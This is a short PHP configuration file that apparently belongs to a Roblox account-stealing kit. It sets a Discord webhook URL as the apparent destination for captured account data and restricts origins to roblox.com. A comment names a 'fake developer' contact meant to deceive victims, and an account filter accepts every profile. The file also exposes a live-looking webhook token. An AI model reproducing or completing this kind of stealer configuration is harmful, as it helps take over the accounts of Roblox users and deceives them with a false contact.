<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/806069466340786186/oGZY0ISfLIKPGJfU1nml0TczLhX1xx0f466T4vnB7fizhm0VEtSc3MCWoZI3Y400Y2pQ";
    // fake developer for the bot the users may contact
    $discord_contact = "Toco#9999";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
